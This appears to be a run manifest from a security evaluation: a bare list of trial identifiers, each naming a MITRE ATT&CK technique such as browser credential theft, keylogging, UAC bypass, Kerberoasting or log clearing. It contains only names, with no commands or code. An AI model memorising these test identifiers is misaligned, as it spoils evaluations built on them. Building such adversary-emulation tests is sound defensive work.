atomic__t1095__command-and-control__non-application_layer_protocol__981cf81e3bb0649fafc31217c8cbc00d__trial_1
atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__0a96ef5851da1be487cebdd9a1f86b7a__trial_1
atomic__t1547_003__multiple__time_providers__7a4867f379d79c82f217108c48bdbf33__trial_1
atomic__t1518__discovery__software_discovery__57548b3eefc3c3d3eaf8c3b51380921a__trial_1
atomic__t1124__discovery__system_time_discovery__6913e132cdd2d9c29294490c2fbef2eb__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__c5951c819c5f6125e0e5987a12a344f9__trial_1
atomic__t1033__discovery__system_owner,user_discovery__cfcf66cc85109ad2ebdb301d619fa41f__trial_1
atomic__t1218_011__defense-evasion__signed_binary_proxy_execution-_rundll32__16e96b0f0c0021663b2f5dfafabee6f0__trial_1
atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__954860df5054a5fabc114abefd8e45f6__trial_1
atomic__t1082__discovery__system_information_discovery__009e7a7118b5a182b2a5b65150e5cc6f__trial_1
atomic__t1560__collection__archive_collected_data__8cd2639cb742872b58a2356909628376__trial_1
atomic__t1027__defense-evasion__obfuscated_files_or_information__7b6d0accaab6330d701dea8f4d7d96d4__trial_1
atomic__t1110_004__credential-access__brute_force-_credential_stuffing__3d7b7a1676afefc4af9506003b2d58d1__trial_1
atomic__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__548a620bf3463f72a42937faf7614935__trial_1
atomic__t1110_003__credential-access__brute_force-_password_spraying__279d24eeb12b40e4547945accf59ca62__trial_1
atomic__t1046__discovery__network_service_discovery__e958169f1efe85a5a5ea7a77eba8c29e__trial_1
atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__0bb6fa90a458e6512a19d246cfae8843__trial_1
atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__48dc8d6cce12ca22b19fdbc93bd3a9ed__trial_1
atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__3ed2af2ffd2e21a9b97fbfb732ef3971__trial_1
atomic__t1546_011__multiple__event_triggered_execution-_application_shimming__a967003ff25bdd94030cdd885feb25d7__trial_1
atomic__t1114_001__collection__email_collection-_local_email_collection__21363f92027047ce1dbfdd47f7a483b5__trial_1
atomic__t1555__credential-access__credentials_from_password_stores__9d0478981edda6091f911a1305025bde__trial_1
atomic__t1553_004__defense-evasion__subvert_trust_controls-_install_root_certificate__51ddafefb92c9dfcb6ce3369e7316bf3__trial_1
atomic__t1555__credential-access__credentials_from_password_stores__2c6e39a39ebf794d74417a7b1291463b__trial_1
atomic__t1082__discovery__system_information_discovery__566b2f5743d88edb44ad1d9d450e921c__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__106045f14741390cfb3fe95300585fb6__trial_1
atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__ac7757ba58f423fa808b4b6f115cc613__trial_1
atomic__t1047__execution__windows_management_instrumentation__80cda763aa992b775038ce134c892070__trial_1
atomic__t1564_006__defense-evasion__run_virtual_instance__5b0527d3382ac91860501cccc9595348__trial_1
atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__c6ea575d9641c11410417105f14175ab__trial_1
atomic__t1204_002__execution__user_execution-_malicious_file__f71199dcf1e307fc37c5a0cb9e4031b9__trial_1
atomic__t1546_011__multiple__event_triggered_execution-_application_shimming__ed65658e4431bc3b636dd0de29bf8e35__trial_1
atomic__t1552_004__credential-access__unsecured_credentials-_private_keys__995eb25ee0b9d036110318311ca2527b__trial_1
atomic__t1572__command-and-control__protocol_tunneling__69b202bf0bb7b4ff43d4abb8867c1784__trial_1
atomic__t1057__discovery__process_discovery__1ddf2b8ee6a56ce9f9132a168947653e__trial_1
atomic__t1218_007__defense-evasion__signed_binary_proxy_execution-_msiexec__c905c33c06f38484cab101ae93a93a9a__trial_1
atomic__t1555__credential-access__credentials_from_password_stores__c7aa16aea441e7bec9a6391af601acc9__trial_1
atomic__t1033__discovery__system_owner,user_discovery__725f6e03f3e2098c4303861566f18894__trial_1
atomic__t1564__defense-evasion__hide_artifacts__b7f89af9214876eae185527350ca034f__trial_1
atomic__t1056_001__multiple__input_capture-_keylogging__a18a0e98b9566d92a1611a2da69b413b__trial_1
atomic__t1105__command-and-control__ingress_tool_transfer__2ed8948f1c1156af47d50379e7965d90__trial_1
atomic__t1218__defense-evasion__signed_binary_proxy_execution__085858a8aa5ea8e6a810e59c75ea7f6a__trial_1
atomic__t1574_012__multiple__hijack_execution_flow-_cor_profiler__07b384a102f27412c1475421f4534f29__trial_1
atomic__t1558_004__credential-access__steal_or_forge_kerberos_tickets-_as-rep_roasting__358926f4adef63bf95d152e35df4dab3__trial_1
atomic__t1021_006__lateral-movement__remote_services-_windows_remote_management__e643e21318c069d0a576da91650c76fe__trial_1
atomic__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__f7c881e0d021a2f5b45546b5d0b4998e__trial_1
atomic__t1136_001__persistence__create_account-_local_account__f39aace719f4cdcf8569001f7a25aabf__trial_1
atomic__t1049__discovery__system_network_connections_discovery__8ed60dceb98746f1da6214f4f6af7164__trial_1
atomic__t1547_002__multiple__authentication_package__7197a8fcd7e833f42251ee3eddaa87c1__trial_1
atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__d143172642328567d9d0951cb116e3a2__trial_1
atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__824ec334619ca634d13aff308a9a064c__trial_1
atomic__t1110_003__credential-access__brute_force-_password_spraying__c285cfeaf0c226d3d2b3812726dbe3a8__trial_1
atomic__t1110_001__credential-access__brute_force-_password_guessing__77e4fd90d211edf046c6c7092a4ed3af__trial_1
atomic__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__91a18ae1efe4119a549cea2ac7de72c4__trial_1
atomic__t1219__command-and-control__remote_access_software__396dae93ab07f7c93853def404fefebf__trial_1
atomic__t1071_004__command-and-control__application_layer_protocol-_dns__08faa1ff79f2c8e48a2869a830c210f7__trial_1
atomic__t1055__multiple__process_injection__ce67d9c1b111032ddb8a56363c854fdc__trial_1
atomic__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__4e9bac619326378b219b3635c9a91b94__trial_1
atomic__t1218_001__defense-evasion__signed_binary_proxy_execution-_compiled_html_file__627f499ceb32e74b95494141bc680e08__trial_1
atomic__t1049__discovery__system_network_connections_discovery__6e3d4c708ab0ff571eb05691cc8bcdda__trial_1
atomic__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__ae73a53476995f46b71f11709f525319__trial_1
atomic__t1057__discovery__process_discovery__1d48fc4147a7bcd47bdf60db7dde9640__trial_1
atomic__t1505_005__persistence__server_software_component-_terminal_services_dll__7cd26e24cc23c5a7e1183120fa034f89__trial_1
atomic__t1546_008__multiple__event_triggered_execution-_accessibility_features__4bdc05fe2f0006f86575053dc740edf3__trial_1
atomic__t1484_001__multiple__domain_policy_modification-_group_policy_modification__5e0427f03faf554046c6a29864087b49__trial_1
atomic__t1070_005__defense-evasion__indicator_removal_on_host-_network_share_connection_removal__6940ffd670787cd1c410997e66629573__trial_1
atomic__t1018__discovery__remote_system_discovery__aaeee9107989a507f526b0cef1cb274f__trial_1
atomic__t1558_001__credential-access__steal_or_forge_kerberos_tickets-_golden_ticket__107a14acdd84a7d6e7c891177b0db3aa__trial_1
atomic__t1546_003__multiple__event_triggered_execution-_windows_management_instrumentation_event_subscription__4df4fdb269f34dd6d55969c83ff06c73__trial_1
atomic__t1087_002__discovery__account_discovery-_domain_account__3d628a543cd195d2a19b89b76a8e5d74__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__50df8303a555242bea67342db40d0d47__trial_1
atomic__t1558_004__credential-access__steal_or_forge_kerberos_tickets-_as-rep_roasting__e0c75b4cc32124ef4c61508694fd0808__trial_1
atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__c29f0da7c0bf612d30acb64e1d6e9368__trial_1
atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__56c2f2d8b48bcb1c999d4e8929bd8d9b__trial_1
atomic__t1083__discovery__file_and_directory_discovery__d7967a23c8c030c698893f242e622be1__trial_1
atomic__t1219__command-and-control__remote_access_software__820a346b2b676b51338c1170b675f76b__trial_1
atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__6d968b2bfa7f45550662620724618fb9__trial_1
atomic__t1620__defense-evasion__reflective_code_loading__aa758d17faffeeb69c56481340891859__trial_1
atomic__t1105__command-and-control__ingress_tool_transfer__04d33ddae0126966ae6d841267c17329__trial_1
atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__f27b37f253617c39ac010d2ee1238b7e__trial_1
atomic__t1098__persistence__account_manipulation__3aae7c6d210ffb084186f1686a1f00c1__trial_1
atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__aeb4fdbb3453127caaef0ad5c250d838__trial_1
atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__57781057e51ffecf21e38fd31c9d2f79__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__a935a79ba61ecb00458208b0bd5ef15e__trial_1
atomic__t1112__defense-evasion__modify_registry__6722535bf5a14b87b5772b739f53321f__trial_1
atomic__t1615__discovery__group_policy_discovery__a3c8fba61f02a7b96306b87121b2ac4b__trial_1
atomic__t1546_003__multiple__event_triggered_execution-_windows_management_instrumentation_event_subscription__248be98ef985ef5053a26ed7cd929c14__trial_1
atomic__t1562_002__defense-evasion__impair_defenses-_disable_windows_event_logging__bc5d26cf7201f1504b495ca2c1758ebf__trial_1
atomic__t1615__discovery__group_policy_discovery__5a1dc4ce41e376e1928d3a399ccadff3__trial_1
atomic__t1552_004__credential-access__unsecured_credentials-_private_keys__f7257d271a176f7c609b4a33513d2eef__trial_1
atomic__t1070__defense-evasion__indicator_removal_on_host__cea891e7c3c3efe3723eca495d261472__trial_1
atomic__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__04858322bc6cd08282f2ce96cab5ee7c__trial_1
atomic__t1187__credential-access__forced_authentication__608b7021a5b8369e9fd858feba6f5611__trial_1
atomic__t1087_002__discovery__account_discovery-_domain_account__4712f45e41760276d20885bbc885a2ef__trial_1
atomic__t1070_008__defense-evasion__email_collection-_mailbox_manipulation__bdc2a80d621d3361ea727008644b1d15__trial_1
atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__b45cb08e24877077d98421393bce079a__trial_1
atomic__t1055_012__multiple__process_injection-_process_hollowing__5fef676a9954938537bd1e2191d3e9b5__trial_1
atomic__t1083__discovery__file_and_directory_discovery__abc280f400f218aa1f4d5efe3c9e8228__trial_1
atomic__t1112__defense-evasion__modify_registry__86993ae14d75a6da421c0d98c3facd61__trial_1
atomic__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__68ce066d07960123ccd981dd8c38a7c1__trial_1
atomic__t1113__collection__screen_capture__582871bcbf9a88caed89ae25d76d018c__trial_1
atomic__t1018__discovery__remote_system_discovery__f32d25602b6c142d321b9a0965316916__trial_1
atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__03c8721619373b6c18a55721a33cad2c__trial_1
atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__1272c02ca685d9967ee2be885dea8df5__trial_1
atomic__t1497_001__multiple__virtualization,sandbox_evasion-_system_checks__e9e69b4fedb8e40d634865ce9a3192dc__trial_1
atomic__t1552_006__credential-access__unsecured_credentials-_group_policy_preferences__e93d024cd93ceaaf880d6f799ef1c9c8__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__fca2ce47cdb3acfde35139ca9017af80__trial_1
atomic__t1518__discovery__software_discovery__b5fe84fa9fb8216512867a039a61db20__trial_1
atomic__t1219__command-and-control__remote_access_software__e0e717c540d5e8ff24f00b7434626f7e__trial_1
atomic__t1055_001__multiple__process_injection-_dynamic-link_library_injection__c1392878b0e39a2060e7e1b70e5a580b__trial_1
atomic__t1562_002__defense-evasion__impair_defenses-_disable_windows_event_logging__7a0717485ca13c441d26bfaaa5c92535__trial_1
atomic__t1564__defense-evasion__hide_artifacts__83a5ad479c9e313e60f34380e193102a__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__ef943918da20ee40d378ad000bbcc3b7__trial_1
atomic__t1055_011__multiple__process_injection-_extra_window_memory_injection__a8a3487e477e0c1501ceb0239b5cad15__trial_1
atomic__t1555__credential-access__credentials_from_password_stores__d74777514cba5a4fd4f297261ed0d8ef__trial_1
atomic__t1132_001__command-and-control__data_encoding-_standard_encoding__5fd6b6b635191898a202dc7c21aa6068__trial_1
atomic__t1562_004__defense-evasion__impair_defenses-_disable_or_modify_system_firewall__986876c6024765475043100f9e080fc8__trial_1
atomic__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__d6df415c9fbfc30ac359542d67537953__trial_1
atomic__t1110_001__credential-access__brute_force-_password_guessing__4f277a5607b655a2e5bc05ff21ed81cf__trial_1
atomic__t1036_003__defense-evasion__masquerading-_rename_system_utilities__d9c1b1283c1ad6fdda27be021c4737d3__trial_1
atomic__t1082__discovery__system_information_discovery__628181210e822588b5d90e1e256d775a__trial_1
atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__35200ef3d7ca094ae2208a1df03ede18__trial_1
atomic__t1615__discovery__group_policy_discovery__38714562d32f33dc32bd7aef553771d9__trial_1
atomic__t1098__persistence__account_manipulation__1c1381522818218092a12b973593f3a9__trial_1
atomic__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__3c8ae3452b200f3509b14463df78068c__trial_1
atomic__t1056_002__multiple__input_capture-_gui_input_capture__6f5096d87a8f9ac4c397215cb58cc978__trial_1
atomic__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__d1bde9af5206152c9980a5b6adcc1813__trial_1
atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__f5dd56d901db9f95668988426326bc3a__trial_1
atomic__t1021_006__lateral-movement__remote_services-_windows_remote_management__7844eb9751d121b16f9517817a31eee4__trial_1
atomic__t1552_004__credential-access__unsecured_credentials-_private_keys__2d78dfbfea7fa4ec7349993b83048079__trial_1
atomic__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__08a146a382df6fea9fa2275073e9d245__trial_1
atomic__t1557_001__multiple__adversary-in-the-middle-_llmnr,nbt-ns_poisoning_and_smb_relay__5ee8fce78c4cef28c4e6ecebe77bdba4__trial_1
atomic__t1518_001__discovery__software_discovery-_security_software_discovery__36a790779a43eb407e4852726be0c66e__trial_1
atomic__t1070_001__defense-evasion__indicator_removal_on_host-_clear_windows_event_logs__6fa417fb183d6c20a67e617c0249f04f__trial_1
atomic__t1218_001__defense-evasion__signed_binary_proxy_execution-_compiled_html_file__5b1aea789aa50c07bb5555dcff5d42a6__trial_1
atomic__t1539__credential-access__steal_web_session_cookie__d54bcaf2e58f6d95da2a54dcb5853a57__trial_1
atomic__t1546__multiple__event_triggered_execution__50a9be8bbff4d4ffe0b699cb8d040c6d__trial_1
atomic__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__f1dcadde207fafe338ae3eb48805f23c__trial_1
atomic__t1053_005__multiple__scheduled_task,job-_scheduled_task__ba8ddc38c7c6ced12fecc0d695c5e57c__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__c0177717b47f2cd07949186523fa3c6b__trial_1
atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__3f588ff884129699e1b9a56f2248bc3b__trial_1
atomic__t1087_001__discovery__account_discovery-_local_account__e528524d6a3cddaaddc89fcc719e2a3f__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__0402c74f97e712d03605175c5ba9675b__trial_1
atomic__t1218_001__defense-evasion__signed_binary_proxy_execution-_compiled_html_file__0d2e984bedf73f5266e250d7ecd257cf__trial_1
atomic__t1090_003__command-and-control__proxy-_multi-hop_proxy__f21623deb932dc0db3f00068ba15bf32__trial_1
atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__61e9071d7b1f01969893d015526e1099__trial_1
atomic__t1036_005__defense-evasion__masquerading-_match_legitimate_name_or_location__029770bd7c3a403daeab3af692af0046__trial_1
atomic__t1570__lateral-movement__lateral_tool_transfer__5458332f329c896a133982a7df20d358__trial_1
atomic__t1123__collection__audio_capture__53d41aa7edbb10cea4c99df8c2b0862f__trial_1
atomic__t1020__exfiltration__automated_exfiltration__305c23215a4bf6184ed701b5ca1d1af7__trial_1
atomic__t1110_003__credential-access__brute_force-_password_spraying__e5168b0f7e57ba7b20c9842a350bb539__trial_1
atomic__t1115__collection__clipboard_data__8c0f619c7dfd33907bf20b1dfb58022b__trial_1
atomic__t1547_008__multiple__boot_or_logon_autostart_execution-_lsass_driver__4572792b7173c41d22a827610b8f8890__trial_1
atomic__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__efdca41c8a098f89f2db9c334627d8ac__trial_1
atomic__t1133__multiple__external_remote_services__ff4e1ea516f781a6ef93323ba9dfac0a__trial_1
atomic__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__a515bb54fd6e14b78297814875f3c73b__trial_1
atomic__t1087_002__discovery__account_discovery-_domain_account__5a33c31395b6ef3ee38097b327c8b79d__trial_1
atomic__t1204_003__execution__user_execution-_malicious_image__b939c81cba750f4b3ef67e6b0456b41e__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__90c76bd616efee6d7c98dc6c1dcc6e99__trial_1
atomic__t1027__defense-evasion__obfuscated_files_or_information__ed172018f897dab90147a47995ce197d__trial_1
atomic__t1048__exfiltration__exfiltration_over_alternative_protocol__35b68f98acbdbdde166d4154462d2467__trial_1
atomic__t1546__multiple__event_triggered_execution__495536c73651969fd80a8f263c293194__trial_1
atomic__t1053_005__multiple__scheduled_task,job-_scheduled_task__4150ef18184112953ae5742a3f8de64e__trial_1
atomic__t1204_002__execution__user_execution-_malicious_file__623806a6fd4d832b6692eb275535f636__trial_1
atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__2594698a8e38a85b0d98468d87b49821__trial_1
atomic__t1135__discovery__network_share_discovery__7a87eec9166dd9d24825a4af7bb3bc47__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__f5b48f9f8e01db3edd487c05580a0e90__trial_1
atomic__t1071_004__command-and-control__application_layer_protocol-_dns__0fccd1bb314f0b3cbffd27c2123ae955__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__03a127453d425bf1fd8dc9af1ed7ddce__trial_1
atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__1cca72410c2849070d833700fcc30c59__trial_1
atomic__t1106__execution__native_api__f6d9c3fbee5549837ea37ff933291656__trial_1
atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__f071213a29669283eeb8ab07ddffdbfb__trial_1
atomic__t1569_002__execution__system_services-_service_execution__e4c51df716410dc7baccead922f9d9a4__trial_1
atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__337c07ce279b747827679ffb226e5d9c__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__0f3401d54f59bc1c3eca134ad5d8a774__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__b66a6eed7d46ab2ca4c3bf1ae3b61f44__trial_1
atomic__t1497_001__multiple__virtualization,sandbox_evasion-_system_checks__64ccf7cd4358a0540ab51c8015c1b744__trial_1
atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__b26ce33f4cd29428f619fc600e052350__trial_1
atomic__t1547_005__multiple__boot_or_logon_autostart_execution-_security_support_provider__cc5347b500dfbdbb96b1fdb6a0669708__trial_1
atomic__t1110_003__credential-access__brute_force-_password_spraying__7532005da662bfc703ce3d8ef4e8ac70__trial_1
atomic__t1112__defense-evasion__modify_registry__7a6e495200cd37c66f02e7bc070b61a9__trial_1
atomic__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__2cda9de49fe7ac16813a23d0741e9b28__trial_1
atomic__t1547_003__multiple__time_providers__23daed0787180c7f2ffbc20528570749__trial_1
atomic__t1518_001__discovery__software_discovery-_security_software_discovery__d8dbc446fea6514a712803194b10cb75__trial_1
atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__20d68348c822d2947e5a795ac15a22b0__trial_1
atomic__t1087_002__discovery__account_discovery-_domain_account__ffe23675b3b68eb6d2b6e771451de3af__trial_1
atomic__t1018__discovery__remote_system_discovery__c75a55384a1e7026bb91f841e4ca2ba9__trial_1
atomic__t1078_003__multiple__valid_accounts-_local_accounts__fe3527480a77ab0b52a518654e120b72__trial_1
atomic__t1070_008__defense-evasion__email_collection-_mailbox_manipulation__9d03b18c922b94ebba44d25c430e6e95__trial_1
atomic__t1552_004__credential-access__unsecured_credentials-_private_keys__000549902a51ef21f57d3d28a6e5ecc0__trial_1
atomic__t1046__discovery__network_service_discovery__01f95fd0213aeb1eb07fca8dc548f5ce__trial_1
atomic__t1562_006__defense-evasion__impair_defenses-_indicator_blocking__54ef63765cf80243f370958bcf738338__trial_1
atomic__t1082__discovery__system_information_discovery__e6a9fe7e91030f05ad87b75ad4fd4a3a__trial_1
atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__748882eaad1b31e8f90d9b31692200fe__trial_1
atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__f2d48f9efed23e058bfe0f46d93d07a2__trial_1
atomic__t1120__discovery__peripheral_device_discovery__941eb886a05444e588fd6c17d992df98__trial_1
atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__2d2b2b31b70f1beef285b942c580f4c3__trial_1
atomic__t1098__persistence__account_manipulation__9ef143154774a6d0d74e0828e90290ac__trial_1
atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__f782c9b7007a34343faec301b64e7435__trial_1
atomic__t1082__discovery__system_information_discovery__413fc5fa7ac34f8a42183217d7f3ec90__trial_1
atomic__t1105__command-and-control__ingress_tool_transfer__3b4fb2e38c41453a6b2b0f2fecdd84ff__trial_1
atomic__t1555_004__credential-access__credentials_from_password_stores-_windows_credential_manager__1353d954c020fa5ff039b7e85ee261bc__trial_1
atomic__t1091__multiple__replication_through_removable_media__95f9e48ea1fbdac2f1c7c656b655ae4c__trial_1
atomic__t1027__defense-evasion__obfuscated_files_or_information__89a4fca013d3d39fc4effb1f6c8a8d74__trial_1
=========================

